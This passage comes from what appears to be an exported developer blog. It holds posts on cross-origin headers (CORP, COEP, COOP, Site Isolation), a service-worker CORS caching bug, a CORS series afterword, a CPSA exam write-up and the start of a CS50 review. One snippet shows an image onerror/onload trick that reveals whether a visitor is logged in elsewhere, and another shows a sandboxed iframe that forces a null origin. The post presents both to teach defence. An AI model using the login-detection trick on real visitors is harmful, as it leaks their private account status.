more like a protocol for accessing APIs or “data” between sources, requiring permission for cross-origin access to data. For resource loading, such as using &lt;img&gt; or &lt;script&gt;, if you want to prevent cross-origin loading, you should only judge the Origin or Referer values on the server side and dynamically determine whether to return data. After the appearance of the CORP header, it provides a way to prevent “any cross-origin loading” by simply setting a header. So this is not just a security consideration, security is just one point, the key is that you can prevent others from loading your resources. As the spec of CORP’s predecessor From-Origin states: The Web platform has no limitations on embedding resources from different origins currently. E.g. an HTML document on http://example.org can embed an image from http://corp.invalid without issue. This has led to a number of problems: For this type of embedded resource, the Web has no restrictions, and you can load whatever you want, which is convenient but also causes some problems, such as: Inline linking — the practice of embedding resources (e.g. images or fonts) from another server, causing the owner of that server to get a higher hosting bill. Clickjacking — embedding a resource from another origin and attempting to let the visitor click on a concealed link thereof, causing harm to the visitor. For example, if I directly link to someone else’s image on my blog, the traffic will be on their server, and they will have to pay the bill. In addition, there may be Clickjacking issues. Privacy leakage - sometimes resource availability depends on whether a visitor is signed in to a particular website. E.g. only with a I’m-signed-in-cookie will an image be returned, and if there is no such cookie an HTML document. An HTML document embedding such a resource (requested with the user’s credentials) can figure out the existence of that resource and thus whether the visitor is signed in and therefore has an account with a particular service. I have seen a website before that can tell whether you are logged in to certain websites, but I can’t find the link now. How does it know? Because some resources may only be accessible when you are logged in. Suppose a certain image URL will only return the image correctly when logged in, and will return a server error if not logged in. Then I just need to write like this: &lt;img src=xxx onerror=\"alert('not login')\" onload=\"alert('login')\"> By whether the image is loaded successfully, you can know whether you are logged in. However, after setting the SameSite cookie, this should not be a problem. License checking - certain font licenses require that the font be prevented from being embedded on other origins. Font websites will prevent users without a license from loading fonts, which is also suitable for this header. In short, the CORB introduced earlier only “prevents unreasonable reading”, such as using img to load HTML, which is purely for security considerations. But CORP can prevent any reading (except for iframe, which has no effect on iframe) and can protect your website’s resources from being loaded by others. It is a more powerful and widely used header. Nowadays, mainstream browsers already support this header. Site IsolationThere are two ways to prevent Spectre attacks: Don’t give attackers a chance to execute Spectre attacks Even if the attack is executed, the desired information cannot be obtained The principle of Spectre attack was mentioned earlier. By knowing which data is placed in the cache by reading the time difference, data can be “stolen” from memory. If the timer provided on the browser intentionally is not accurate, can’t it be defended? Because the seconds calculated by the attacker will be similar, and they don’t know which reading is faster. After the Spectre attack appeared, the browser did two things: Reduce the accuracy of performance.now Disable SharedArrayBuffer The first point is easy to understand. By reducing the accuracy of the time function, attackers cannot determine the correct reading speed. Why is the second point? Let’s talk about SharedArrayBuffer first. This thing allows the JS of your document and web worker to share the same memory and share data. So in the web worker, you can make a counter that keeps adding up, and then read this counter in JS to achieve the function of a timer. So after Spectre appeared, the browser made these two adjustments, starting from the perspective of “preventing the source of the attack”, which is the first way. The other way is not to let malicious websites get information from cross-origin websites, which is the CORB mentioned earlier, and now to introduce: Site Isolation. Here is an introduction from Site Isolation for web developers: Site Isolation is a security feature in Chrome that offers an additional line of defense to make such attacks less likely to succeed. It ensures that pages from different websites are always put into different processes, each running in a sandbox that limits what the process is allowed to do. It also blocks the process from receiving certain types of sensitive data from other sites. In short, Site Isolation ensures that resources from different websites are placed in different processes. Therefore, even if you execute a Spectre attack on your own website, it doesn’t matter because you cannot read data from other websites. Site Isolation is currently enabled by default in Chrome, and the corresponding disadvantage is that more memory is used because more processes are opened. Other impacts can be found in the article mentioned above. In addition to Site Isolation, there is another thing that is easy to confuse (I originally thought they were the same when writing this article, but later found out that they are different), called “cross-origin isolated state.” What is the difference between these two? According to my understanding (not guaranteed to be completely correct), the article “Mitigating Spectre with Site Isolation in Chrome” mentions: Note that Chrome uses a specific definition of “site” that includes just the scheme and registered domain. Thus, https://google.co.uk would be a site, and subdomains like https://maps.google.co.uk would stay in the same process. The definition of “Site” in Site Isolation is the same as that of the same site. http://a.example.com and http://b.example.com are the same site, so even under Site Isolation, these two web pages will still be placed in the same process. Cross-origin isolated state should be a stronger isolation, isolating everything that is not the same origin, even if it is the same site. Therefore, http://a.example.com and http://b.example.com will be isolated. Moreover, the object of Site Isolation is the process, while cross-origin isolated state seems to isolate the browsing context group, not allowing cross-origin things to be in the same browsing context group. This cross-origin isolated state is not enabled by default, and you must set these two headers on your webpage to enable it: Cross-Origin-Embedder-Policy: require-corp Cross-Origin-Opener-Policy: same-origin As for why these two are used, I will tell you later. COEP (Cross-Origin-Embedder-Policy)To achieve cross-origin isolated state, you must ensure that all cross-origin access on your website is legal and authorized. The COEP (Cross-Origin-Embedder-Policy) header has two values: unsafe-none require-corp The first is the default value, which means there are no restrictions, and the second is related to CORP (Cross-Origin-Resource-Policy) mentioned earlier. If you use require-corp, it means telling the browser that “all resources I load on the page must have the existence of CORP (or CORS), and they must be legal.” Now, suppose we have a website a.example.com and we want to make it a cross-origin isolated state, so we add a header to it: Cross-Origin-Embedder-Policy: require-corp, and then introduce a resource in the webpage: &lt;img src=\"http://b.example.com/logo.jpg\"> Then we send the correct header on the b side: app.use((req, res, next) => &#123; res.header('Cross-Origin-Resource-Policy', 'cross-origin') next() &#125;) This completes the first step. In addition, I mentioned earlier that there is a slight difference between not setting CORP and setting it to cross-origin, which is the difference here. If b does not send this header in the above example, the Embedder Policy will not pass. COOP (Cross-Origin-Opener-Policy)The second step is the COOP (Cross-Origin-Opener-Policy) header. As I mentioned earlier, when you use window.open to open a webpage, you can manipulate the location of that webpage, and the opened webpage can also manipulate your webpage using window.opener. This creates a connection between the windows, which violates cross-origin isolation. Therefore, the COOP header is used to regulate the relationship between windows and openers, and there are three values: Cross-Origin-Opener-Policy: unsafe-none Cross-Origin-Opener-Policy: same-origin Cross-Origin-Opener-Policy: same-origin-allow-popups The first one is the default value and has no effect. The second one is the strictest. If you set it to same-origin, the “window you opened” must also have this header and must also be set to same-origin so that you can share the window between them. Let’s do an experiment. We have two webpages: http://localhost:5566/page1.html http://localhost:5566/page2.html The content of page1.html is as follows: &lt;script> var win = window.open('http://localhost:5566/page2.html') setTimeout(() => &#123; console.log(win.secret) &#125;, 2000) &lt;/script> The content of page2.html is as follows: &lt;script> window.secret = 5566 &lt;/script> If page1 successfully outputs 5566, it means that the two windows are shared. Otherwise, they are not. Let’s try without any header first. Since these two are the same origin, they can already share windows, and 5566 is successfully output. Next, we change the server-side code to this: app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin') &#125; next() &#125;) Only page1.html has COOP, and page2.html does not. The result of the experiment is “cannot share”. Even if it is changed to this: app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin') &#125; if (req.url === '/page2.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; next() &#125;) It is still impossible to share because the same-origin condition is: The opened window must be in the same origin. The response header of the opened window must have COOP, and the value must be same-origin. Only when these two points are met can you successfully access the complete window. And one thing to note is that once this header is set but the rules are not met, not only can you not access the complete window, but you cannot even get openedWindow.close and window.opener. The two windows are completely unrelated. The conditions for same-origin-allow-popups are more relaxed: The opened window must be in the same origin. The opened window does not have COOP, or the value of COOP is not same-origin. In short, same-origin not only protects others but also protects yourself. When you set it to this value, whether you open someone else’s or are opened by someone else, you must be in the same origin and have the same header to access each other’s windows. For example, I adjusted it to this: app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; next() &#125;) Only page1 has set same-origin-allow-popups, and page2 has not set anything. In this case, they can access each other’s windows. Next, if they are the same: app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; if (req.url === '/page2.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; next() &#125;) This is also fine. But what if it’s like this? app.use((req, res, next) => &#123; if (req.url === '/page1.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin-allow-popups') &#125; if (req.url === '/page2.html') &#123; res.header('Cross-Origin-Opener-Policy', 'same-origin') &#125; next() &#125;) This won’t work. So to summarize, suppose there is a webpage A that opens a webpage B using window.open: If AB is cross-origin, the browser has restrictions and can only access methods such as window.location or window.close. It cannot access the DOM or other things. If AB is same-origin, they can access almost the entire window, including the DOM. If A adds a COOP header and the value is same-origin, it means that more restrictions have been imposed on the second case, and only when B also has this header and the value is also same-origin can they access each other’s windows. If A adds a COOP header and the value is same-origin-allow-popups, it is also a restriction on the second case, but it is more relaxed. As long as the COOP header of B is not same-origin, they can access each other’s windows. In short, to “have the opportunity to access the window mutually”, it must first be same-origin, which is unchangeable. In fact, whether it can be accessed or not depends on whether the COOP header and the value of the header are set. If the COOP header is set but does not comply with the rules, window.opener will become null directly, and you cannot even get the location (if the rules are not set, you can get it even if it is cross-origin). In fact, according to the spec, there is also a fourth type: same-origin-plus-COEP, but it seems more complicated, so let’s not study it for now. Back to cross-origin isolated stateAs mentioned earlier, cross-origin isolated state requires setting these two headers: Cross-Origin-Embedder-Policy: require-corp Cross-Origin-Opener-Policy: same-origin Why? Because once set, it means that all cross-origin resources on the page are accessible to you, and if you do not have permission, an error will occur. So if it is set and passed, it means that all cross-origin resources are allowed to be accessed by you, and there will be no security issues. On the website, you can use: self.crossOriginIsolated to determine if you have entered the cross-origin isolated state. If so, you can use some sealed (?) functions because the browser knows you are very safe. In addition, if you enter this state, the trick of bypassing the same-origin policy by modifying document.domain mentioned earlier will not work, and the browser will not let you modify this thing. To learn more about COOP, COEP, and cross-origin isolated state, please refer to: Making your website “cross-origin isolated” using COOP and COEP Why you need “cross-origin isolated” for powerful features COEP COOP CORP CORS CORB - CRAP that’s a lot of new stuff! Making postMessage() work for SharedArrayBuffer (Cross-Origin-Embedder-Policy) #4175 Restricting cross-origin WindowProxy access (Cross-Origin-Opener-Policy) #3740 Feature: Cross-Origin Resource Policy SummaryThis article actually talks about a lot of things, all revolving around security. At the beginning, we talked about the consequences of incorrect CORS settings and defense methods, followed by using document.cookie to modify same-site to same-origin (both websites must agree to do so), and finally the highlight of this article: CORB (Cross-Origin Read Blocking) CORP (Cross-Origin Resource Policy) COEP (Cross-Origin-Embedder-Policy) COOP (Cross-Origin-Opener-Policy) It took a lot of time to find information because the names are too similar and some of the functions are actually quite similar, but after looking at them for a long time, you will find that they are quite different, and each policy focuses on different things. I hope that the context I have organized will help you better understand these things. If you want to summarize these four things in one sentence, it may be: CORB: the default mechanism of the browser, mainly to prevent loading unreasonable resources, such as using img to load HTML CORP: an HTTP response header that determines who can load this resource, and can prevent cross-origin loading of images, videos, or any resources COEP: an HTTP response header that ensures that all resources on the page are legally loaded COOP: an HTTP response header that adds stricter window sharing settings to same-origin Compared to the others, I am not as familiar with the content of this article. If there are any mistakes, please don’t hesitate to point them out. Thank you. Next, the next article will be the last one in this series: CORS Complete Guide (Part 6): Summary, Afterword, and Leftovers","link":"/2021/02/19/en/cors-guide-5/"},{"title":"CORS is not as simple as I thought","text":"IntroductionCORS (Cross-Origin Resource Sharing) has always been a classic problem in front-end development. Simply put, due to some security considerations of the browser, you will encounter some restrictions when loading resources from other domains. The solution is simple, just add some response headers such as Access-Control-Allow-Origin on the server side. With this header, the browser will recognize that you have been verified and there will be no problem. I have written an article about this problem before: Understanding Ajax and Cross-Origin Requests, which details the problems encountered and their solutions. I thought that since I had delved into this problem last time, CORS would never be a problem for me again, and I would never see the error of “forbidden to access cross-origin” in the console. But I was wrong. This time, I stumbled in a specific use case, but I also learned a lot from it. This experience also reminded me of what I wrote before: The most difficult cookie problem I have ever encountered. Great, there is something to share with you again! The Tragic BeginningThe thing is, a while ago, the company’s product redesign entered the final stage. The serious bugs were almost fixed, and the next step was to start adjusting some performance and testing the most important new feature of this redesign: PWA! For those who don’t know what PWA is, let me explain briefly here. PWA stands for Progressive Web App, which is simply to make your Mobile Web more like an App through some browser support. The most important thing is that you can use Service Worker to cache any request (even API requests). If done well, you can even open this webpage offline. In addition, through the browser, you can add your website to the main screen, just like installing it in your phone, becoming no different from an App. Below are three screenshots that will give you a better sense of PWA. First, you can add this webpage to the main screen: The second one is that this PWA will be like other Native Apps, existing in your phone. You can’t tell whether it is a Native App or a PWA just by looking at this page. The last one is that after you open this PWA, it will become full screen. Just by looking at this screenshot, it is no different from a Native App. In short, you can think of PWA as: existing website + new technology (Service Worker, manifest.json…), combined to become PWA. That’s all for the simple introduction to PWA. If you want to learn more, you can refer to what @arvinh wrote: Will Progressive Web App be the future trend? or When React web app meets Progressive web app. For PWA, the most important thing is actually this Service Worker (hereinafter referred to as SW). Chrome’s built-in Lighthouse can give a PWA score for the webpage. SW is one of the considerations, because you must implement SW to cache files and implement the offline opening App function. The following figure shows the items that Lighthouse will check: Alright, the preface is over, let’s get to the point. We’ve done everything we need to do for our PWA, including registering the service worker and implementing offline functionality. However, there’s one thing that keeps failing in Lighthouse’s tests: registering the service worker. No matter how many times we test it, Lighthouse keeps saying that our website doesn’t have a registered service worker. It’s really strange. I tried testing it manually in a clean Chrome window in incognito mode, and I confirmed that the service worker is definitely registered. But no matter how I test it in Lighthouse, it keeps saying that it’s not registered. So what should we do? Fortunately, Lighthouse is open source and provides a CLI version that you can run on your own computer. So I thought, since Lighthouse says it’s not registered, let’s take a look at how Lighthouse is testing it. I did a little research on the source code of Lighthouse and found that the testing method seemed fine. So I decided to modify Lighthouse to prevent it from closing the window after running the tests, so that I could see if there was any useful information in the console and if the message that should be printed when registration is successful was printed. I made a few changes: Added a configuration file to only run the service worker test. After running the test, Chrome won’t be closed. Added a log in the service worker check. If you need it, the parts I changed are here: PR for the changes After making the changes, I ran the tests again. And at that moment, I remembered the fear of being trapped by CORS: Clearing the clouds and seeing the sunSince we have some clues, we should investigate them thoroughly. From the screenshot, it looks like the service worker is registered successfully, but there are some errors when using the cached files with the service worker, which seems to affect the entire test. Anyway, as long as we solve this CORS problem, everything should be fine. Let me give you some background information first. We store all our static files on Amazon S3 and use Cloudfront in front of it. We have followed Amazon’s instructions to add what we need to add, so if the request header has an origin, the response will definitely have the CORS header. So there should be no problem. And when the service worker caches files, it uses fetch, so it will definitely add the origin header, and there is no reason for it to fail. After being stuck for an hour or two, I decided to take a look at the network tab and found more clues: The following is a request sent from the service worker. The header does have an origin, but the response does not have Access-Control-Allow-Origin! In addition, I found an identical request earlier. Since this request was sent by &lt;script&gt;, it did not include the origin, so the response did not have the CORS header. It’s worth noting that the second response is from disk cache (although both are in the screenshot, that’s because I didn’t clear the cache when taking the screenshot, in fact, only the second one should be). After investigating these clues, I have a rough idea of what’s going on. In-depth investigationAlright, let me explain. The file that the service worker needs to cache is one of the JavaScript files that the page will load. Since the page will load it, we put a &lt;script&gt; tag in the HTML to load this file. From the screenshot, it looks like the browser loaded this JavaScript file first, and because it wasn’t sent via AJAX, it didn’t include the origin. According to S3’s rules, there was naturally no Access-Control-Allow-Origin. Next, after successfully registering SW, we started executing the code inside it to cache the list we prepared in advance, one of which is this JavaScript file. However, when we used fetch to retrieve this file, the browser directly used the cached previous response (because the URL and method are the same), and this response did not have Access-Control-Allow-Origin! Therefore, the cross-domain error we saw at the beginning occurred. The truth is revealed here, all due to browser caching issues. Why couldn’t I find this problem when I tested it myself before? As a front-end engineer, it is reasonable to check “Disable cache” in devtool, so no matter how I tried, I couldn’t find this problem. After knowing the cause of the problem, it is relatively simple. I searched on Google and found this Chromium ticket: CORS Preflight Cache Does not Consider Origin The problem encountered inside is basically the same as what I encountered. The solution given in the end is to add a Vary: Origin to the response, so that the browser knows not to use the cache if the Origin is different. However, I found that we had already added it but didn’t know why it didn’t work. In addition, I found several similar problems: Chrome S3 Cloudfront: No ‘Access-Control-Allow-Origin’ header on initial XHR request S3 CORS, always send Vary: Origin Later, I adopted one of the solutions inside: “Since S3 needs an origin header to enable CORS, let’s send a fixed origin to it using Cloudfront! This way, every response will definitely have Access-Control-Allow-Origin!” You can refer to this article: AWS CloudFront + S3 + Allow all CORS, which is basically just adjusting a setting. This trick sounds quite effective, but it is not the best solution. It feels a bit dirty, after all, origin is not used in this way. It doesn’t seem too good to do this for the S3 mechanism. So in the end, I thought of something that also solved a doubt in my mind. That is to add crossorigin=&quot;anonymous&quot; to &lt;script&gt;, so that the request sent by &lt;script&gt; also has an origin header! I have seen some places add this before, but I still don’t understand why it needs to be added, because scripts can be unrestricted by domain. Why do you need to add a tag to make it look like an ajax request? But unexpectedly, this attribute helped me. Once I added it, the script loading would attach Origin, and S3 would return Access-Control-Allow-Origin, so I wouldn’t encounter cross-domain issues later! As for the other functions of this attribute, you can refer to: Purpose of the crossorigin attribute …? ConclusionTo encounter the problem I encountered, you must meet the following four conditions at the same time: You put the static files on S3 You did not check the browser’s Disable cache You used script and SW to load the same file The browser uses the cached script response to respond to the SW request If any of the conditions are not met, this problem will not occur. In other words, it is quite difficult to encounter this problem. But the more pits you step on, the stronger you become. Solving one problem means you have one less problem to encounter in the future. After solving this CORS-related problem, I think I won’t encounter related problems in the future… I hope.","link":"/2018/08/18/en/cors-is-hard/"},{"title":"CORS Complete Guide (6): Summary, Afterword, and Leftovers","text":"PrefaceThis article has a little less technical content, and I would like to share with you the process of writing this series of articles and some thoughts after finishing it. If you haven’t read this series of articles yet, the links are as follows: CORS Complete Guide (1): Why CORS Error Occurs? CORS Complete Guide (2): How to Solve CORS Problems? CORS Complete Guide (3): CORS Details CORS Complete Guide (4): Looking at the Specification Together CORS Complete Guide (5): Security Issues of Cross-Origin CORS Complete Guide (6): Summary, Afterword, and Leftovers OriginIn the first article, I mentioned the original intention of writing this series of articles. It’s because I have seen too many people asking about CORS issues, and some people don’t care about the context and recommend using a proxy or CORS Anywhere. If it is a third-party resource without permission, then this solution is reasonable, but if it is the company’s own service, the backend should be called to set it up instead of connecting to the proxy by yourself. The most common CORS errors are probably: Don’t know that CORS blocks response instead of request (except for preflight) Don’t know why CORS is needed Don’t know how to solve CORS problems (trying everywhere, thinking that no-cors is the solution) Don’t know how to debug (should look at the console and network tab) Incorrectly solving CORS problems (using proxy instead of asking the backend to change) In April 2020, I had the idea of writing this series of articles, and then started researching. I planned the five articles that you see at the beginning, and started writing in July 2020. I wrote the first article continuously for about two or three days, wrote about half of the second article, and then stopped. The reason for stopping was probably because I didn’t know how to write the third article: CORS Details, and I didn’t have many ideas about looking at the spec together in the fourth article, so I procrastinated and left it there. I didn’t continue writing until February 2021, and then finished all the subsequent articles in one go. The reason for starting to write again is that this is a stone in my heart. If I don’t finish writing this series, I will feel a little uneasy when I do other things, thinking “Is this series of articles not going to be finished?” AfterwordFortunately, I have finished writing it. Because I have gained a lot from the process of writing articles, I spent a lot of time understanding some details, such as the Spectre attack, which I studied for a while. Although I still don’t understand it completely, I need to supplement the knowledge related to the operating system to fully understand it. The COXX headers in the fifth article also took a lot of time. I looked up a lot of information and read the issues proposed by the original proposal. I understand the reasons for these policies. In the process of research, I also found that many security-related things are actually linked together, such as: Same-origin policy window.open iframe CSP SameSite cookie In the process of finding information, I can see many overlapping places, especially SameSite cookie. The more I think about it, the more I feel that this thing is really important and can prevent many attacks. By the way, when writing this article, most of the reference materials actually come from Google Chrome, so there are many places in the article that use “browser”, which may only be implemented in Chrome now, and other browsers have not followed up yet. However, Chrome does have the most resources, and often posts some technical articles on the blog, which are very valuable resources. I think that both front-end and back-end engineers should have a certain understanding of CORS, so that they know how to solve problems when they encounter them. Although CORS is a problem that many novice engineers have encountered, it is not particularly difficult to understand the context after sorting out the logic. It just takes some time to understand the operation mode of CORS. Once you understand it, you will not be afraid of encountering this problem in the future. Regarding the various COXX things in the fifth article, I think that unless you need to use those sealed functions, or your website needs high security, you can study them when you have time. Just having an impression is enough. After finishing this series of articles, there are some things I want to talk about that I couldn’t find a place for, so the following paragraphs will discuss some of the leftovers. CORS Issues That May Not Be CORS IssuesBrowser error messages are a great source of information, but they are not always reliable. Some CORS issues may not be due to improperly set response headers, but rather because a previously improperly set response was cached, or even due to certificate issues! See: CORS request blocked in Firefox but not other browsers #2803 Firefox ‘Cross-Origin Request Blocked’ despite headers CORS request did not succeed on Firefox but works on Chrome Origin PolicyWhen using CORS, we actually spend a lot of time on the preflight request. Assuming there is no caching and all requests are non-simple requests, cross-origin requests have twice as many requests as same-origin requests because each request has an additional preflight request attached. However, most website rules for CORS are consistent, so why not write a configuration file for the browser to read? This way, the browser will know if a source is allowed, and there will be no need to keep sending preflight requests. The idea behind this comes from: RFC: a mechanism to bypass CORS preflight #210, and if you have time, you can take a look at the discussion inside. In fact, not only CORS, but other headers may also have similar situations, such as CSP. In most cases, the CSP for the entire website is actually the same, but now every HTTP response has to return the same CSP header, which can also be read by the browser through a configuration file, so there is no need to send them individually. All of the above was expanded into something called Origin Policy, which is the idea of writing a file and placing it in /.well-known/origin-policy for the browser to read. This can save a lot of response size, but it is currently just a proposal. Cross-Origin Image LoadingUsually, when using img, it is &lt;img src=xxx&gt;, which is a normal way to fetch resources. But actually, there are some tags in HTML that can fetch resources in a “cross-origin” way, such as &lt;img&gt;, and others can be found at: MDN: HTML attribute: crossorigin . Just do this: &lt;img src=xxx crossorigin> In fact, crossorigin has three attributes: Not set&#x2F;empty string anonymous use-credentials The first two are the same, and the latter is like the credentials: &#39;include&#39; in fetch. Anyway, as long as you add crossorigin, for cross-origin files, the backend must add Access-Control-Allow-Origin like CORS, so that the frontend can correctly access the image. Why do we have to use CORS to load images that are perfectly fine? There are two reasons. The first reason is that in the previous article, I mentioned that “if you set COEP to require-corp, it means telling the browser that ‘all resources I load on the page must have the presence of CORP headers (or CORS), and they must be legal’”. Assuming you now set COEP to require-corp, if you use &lt;img src=xxx&gt; to load images on your website, this image must have the CORP header. What if it really doesn’t? You can load images using cross-origin method, that is: &lt;img src=xxx crossorigin&gt;. Under this method, images do not need to have the CORP header, only the Access-Control-Allow-Origin header is required, because this loads the image using the CORS mode. The second reason, do you remember I mentioned before that if you load a cross-origin image and try to read the image content using JS, will it produce an error? If you load it using cross-origin mode, there will be no such error. For more information, please refer to: Allowing cross-origin use of images and canvas. Chromium’s CORS handling codeI haven’t looked at it in detail, just taking notes: chromium&#x2F;chromium&#x2F;src&#x2F;+&#x2F;master:services&#x2F;network&#x2F;public&#x2F;cpp&#x2F;cors&#x2F;cors.cc Is a URI always the same origin as itself?The answer is given in rfc6454: NOTE: A URI is not necessarily same-origin with itself. For example, a data URI [RFC2397] is not same-origin with itself because data URIs do not use a server-based naming authority and therefore have globally unique identifiers as origins. Data URI is not the same origin as itself. However, I couldn’t find this section in the new fetch spec. How to make the origin “null”As mentioned earlier, null origin and “null” are different, because the origin can indeed be a string of null, for example, when you open a file:/// page and send a request, or when you use AJAX in a sandboxed iframe: &lt;iframe sandbox='allow-scripts' srcdoc=' &lt;script> fetch(\"/test\"); &lt;/script> '>&lt;/iframe> The code is rewritten from: AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle SummaryFinally finished writing this series. I hope that after reading this series, everyone will have a better understanding of CORS and other related concepts of cross-origin, and will no longer be afraid of CORS errors and know how to solve them. As I said at the beginning of the first article, I hope this series can become a treasure trove of CORS, and everyone who encounters problems can solve them after reading this series. If there are any errors or omissions, please let me know by private message or comment. Thank you.","link":"/2021/02/19/en/cors-guide-6/"},{"title":"CPSA (CREST Practitioner Security Analyst) Exam Experience","text":"There is very little information available in Chinese about CREST, the organization, and CPSA, the certification. In Taiwan, it is considered a relatively obscure certification. I gained a basic understanding of this organization and certification after reading this article: ECSA v10 Equivalent Application CREST CPSA Security Analyst Certification Tutorial &#x2F; ECSA with CPSA Equivalency Recognition Step. In December, I took the CPSA certification exam with a colleague and we both passed. I am writing this post to share my experience. Introduction to CPSALet me briefly introduce CPSA, which stands for CREST Practitioner Security Analyst. It is an entry-level certification offered by CREST. The CREST series chart on the official website shows that CPSA belongs to the penetration testing category and is the most basic certification in this category: This certification is also listed in the Professional List of Information Security Certifications published by the Executive Yuan: The official website provides the following description of CPSA: The CREST Practitioner Security Analyst (CPSA) examination is an entry-level examination that tests a candidate’s knowledge in assessing operating systems and common network services at a basic level below that of the main CRT and CCT qualifications. The CPSA examination also includes an intermediate level of web application security testing and methods to identify common web application security vulnerabilities. This means that CPSA is an entry-level certification that tests basic knowledge of operating systems, network security, and intermediate-level knowledge of web security. The exam consists of 120 multiple-choice questions with five options each, and candidates have two hours to complete the exam. The exam must be taken at a specific test center (Pearson Vue test centers). CPSA Exam Content and PreparationThe CPSA official website provides a detailed outline of the exam content. However, I prefer the simplified version provided by the CPSA course, which gives a basic understanding of the exam content after a quick read: Module 1: Soft Skills and Assessment Management Engagement Lifecycle Law and Compliance Scoping Understanding, Explaining and Managing Risk Record Keeping, Interim Reporting and Final Results Module 2: Core Technical Skills IP Protocols Network Architectures Network mapping and Target Identification Filtering Avoidance Techniques OS Fingerprinting Application Fingerprinting and Evaluating Unknown Services Cryptography Applications of Cryptography File System Permissions Audit Techniques Module 3: Background Information Gathering and Open Source Registration Records Domain Name Server (DNS) Google Hacking and Web Enumeration Information Leakage from Mail Headers Module 4: Networking Equipment Management Protocols Network Traffic Analysis Networking Protocols IPsec VoIP Wireless Configuration Analysis Module 5: Microsoft Windows Security Assessment Domain Reconnaissance User Enumeration Active Directory Windows Passwords Windows Vulnerabilities Windows Patch Management Strategies Desktop Lockdown Exchange Common Windows Applications Module 6: UNIX Security Assessment User Enumeration UNIX&#x2F;Linux Vulnerabilities FTP Sendmail&#x2F;SMTP Network File System (NFS) R-Services X11 RPC Services SSH Module 7: Web Technologies Web Server Operation &amp; Web Servers and Their Flaws Web Enterprise Architectures Web Protocols Web Markup Languages Web Programming Languages Web Application Servers Web APIs Web Sub-Components Module 8: Web-Testing Methodologies Web Application Reconnaissance Threat Modelling and Attack Vectors Information gathering from Web Mark-up Authentication Mechanisms Authorisation Mechanisms Input Validation Information Disclosure in Error Messages Use of Cross Site Scripting (XSS) Use of Injection Attacks Session Handling Encryption Source Code Review Module 9: Web Testing Techniques Web Site Structure Discovery Cross Site Scripting Attacks SQL Injection Parameter Manipulation Module 10: Databases Databases Microsoft SQL Server Oracle RDBMS MySQL You will find that the exam content is quite extensive, covering almost everything, and a little bit of everything is tested. Therefore, at the beginning, I found it difficult to prepare and didn’t know where to focus. So the first thing I did was to search for some English exam experience online: CREST CPSA Exam Taking the CPSA (Crest Practitioner Security Analyst) Exam CREST Practitioner Security Analyst (CPSA) Exam - Study Guide The third one is the most detailed and has a lot of reference materials and resources, which I found very helpful. Here are some directions I prepared myself: The full names of various proprietary terms, such as what HTTP or SSL stands for. Network-related knowledge, including the OSI model and protocols such as IP, TCP, UDP, and ICMP. Basic understanding of common encryption algorithms (such as DES, AES, and RSA) and hash functions (such as MD5 and SHA1). DNS-related knowledge. Which ports are used by common services. Since I consider myself more familiar with web-related topics, I didn’t prepare much for that area and focused on the above topics instead. The passing score for CPSA is 60% correct answers. My strategy was to focus on the above topics and skip the ones I found difficult or didn’t want to study. So there were some topics on the exam outline that I had never even looked at before, and I had to guess on those questions during the exam. My main resource for preparation was not the official recommended books, which I found boring and lengthy, but rather a GitHub repository that a colleague found, which had some useful summaries of key points. Overall, I found the exam not too difficult but a bit tedious. If you are already familiar with network-related knowledge (to the point where you can answer network-related questions in a computer science course), and have basic web knowledge, studying for a week or two should be enough to pass. CPSA ExamThe registration fee for the exam is $400 USD, which is about NT$11,000. There seem to be only two exam centers in Taiwan, one in Taipei and one in Kaohsiung. The Taipei exam center is near the Xinyi District City Hall MRT station: https://goo.gl/maps/2hCkEpEidb8WbYQw7 You need to arrive 30 minutes early for check-in. Once you enter the exam room, you need to store all your belongings in a locker and cannot access any books or materials. So if you want to review anything, it’s best to do it outside the exam room. Then you go through the check-in process, where you need to bring your passport and a signed document (I used my credit card) and take a photo. After that, you will be taken to the testing area, where there are many individual computer desks separated by wooden boards. You take the exam on that computer, and you can mark questions for review later. There doesn’t seem to be a time limit for the exam, so you can submit your answers whenever you’re finished. I think I took about an hour and a half. After submitting, the exam staff will come to your seat and escort you out. You can retrieve your belongings from the locker, and they will give you a printed result sheet with your score and pass&#x2F;fail status, as well as your performance in each major category. I barely passed, but I made it. A few days later, I received the certificate from CREST. ConclusionOverall, I found the exam not too difficult but a bit tedious. My network knowledge is weak, so I lost some points there. If you are already familiar with network-related knowledge and have basic web knowledge, you should be able to pass the exam with some preparation. Although the certification is not well-known in Taiwan, it has some recognition in some places abroad. If you have OSCP, you can use it to exchange for another CRT certification. For me, I just wanted to take the exam and be prepared for the future. If you are interested, you can try taking the exam. If you have any related questions, you can leave a comment below, and I will try to answer within my ability.","link":"/2021/12/15/en/crest-cpsa-prepare/"},{"title":"An Ocean-like Programming Course: CS50","text":"The full name of CS50 is Introduction to Computer Science, which is a general education course at Harvard University. It is available on edx, and anyone can take it. There are even teaching assistants to help you with programming assignments (only programming assignments, not other types of assignments like paper-based ones). The first time I heard about CS50 was through this report: CS50: A “hard” course taken by over 800 Harvard students, what makes it so attractive?. It wasn’t until I finished the course recently that I understood what makes this course so impressive. Let’s start with the meaning of the title: An Ocean-like Programming Course. Why the ocean? Because this course is deep and wide. How deep and wide is it? I recorded the course outline and assignments for each week. If you have a friend with a computer science background, they will know what I mean. Week 0Binary, ASCII, RGB, binary searchIntroduction to basic programming language: conditional statements, variables, loops, arrays, functionsAssignment: Write a program using scratch Week 1Introduction to C language and the concept of compilationIntroduction to various types, such as double, float, int, bool, char, long long…Introduction to floating-point errors and overflowTeaching basic command line operations, such as mv, ls, cd, make, etc.Assignment: Write a simple C program (loop to print stars) Week 2Introduction to function, string, arrayHow to use argc and argv to pass parametersAlso talked about encryption, such as RSATeaching command line Redirecting (&gt;) and Pipe (|)Assignment: String processing, simple encryption and decryption implementation Week 3Search, sorting (bubble, insertion, selection, quicksort, merge), big ORecursion, bit operationsUsing GDBAssignment: Implement 